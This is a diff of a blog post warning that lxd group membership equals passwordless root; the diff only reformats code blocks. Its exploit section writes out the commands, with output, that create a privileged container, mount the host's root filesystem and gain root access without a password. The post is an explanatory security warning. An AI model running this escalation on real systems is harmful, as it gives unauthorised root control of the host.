@@ -16,9 +16,9 @@ The lxd group should be considered harmful in the same way the [docker](https://
 
 Firstly, I'd check if your user is a member of this group, because chances are that if you've installed it and are a sudoer, that you are.  Upon installation, lxd automatically adds every user to the lxd group.  Whilst this could be considered okay, considering that a sudoer automatically has root access, it forgets that sudo has auditing capabilities in place, and does require a password to perform any actions that would be required by root.  In fact, merely installing lxd is equivalent to adding the following in your sudoers file.
 
-{%highlight bash%}
+```bash
 admin    ALL=NOPASSWD: ALL
-{%endhighlight%}
+```
 
 If someone gains access to the admin account then immediately they have full root access without a password.  Consider an ssh private key escaping into the wild or an outdated service running under this user, and suddenly an attacker who still hasn't cracked the admin accounts password has full root access, all because you installed lxd. 
 
@@ -58,18 +58,18 @@ Exploiting
 -----------
 So it's all good me harping on about the security risks but lets see it in action.  I only found this thanks to [#2003](https://github.com/lxc/lxd/issues/2003)
 
-{%highlight bash%}
+```bash
 ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
 Creating test 
 ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
 Device whatever added to test 
 ubuntu@ubuntu:~$ lxc start test 
 ubuntu@ubuntu:~$ lxc exec test bash 
-{%endhighlight%}
+```
 
 Here we have created an lxc container, assigned it security privileges and mounted the full disk under `/mnt/root`.  
 
-{%highlight bash%}
+```bash
 ubuntu@ubuntu:~$ lxc exec test bash 
 root@test:~# cd /mnt/root 
 root@test:/mnt/root# ls 
@@ -87,6 +87,6 @@ root@ubuntu:/home/ubuntu# cat /root/ICanDoWhatever
 root@ubuntu:/home/ubuntu# ls /root 
 ICanDoWhatever 
 root@ubuntu:/home/ubuntu#  
-{%endhighlight%}
+```
 
 So now see how we haven't once typed our password in or escalated privileges manually.  We could even remove ourselves from sudoers and do all this, making root escalation trivial.  Lesson learnt, use the lxd group with care.
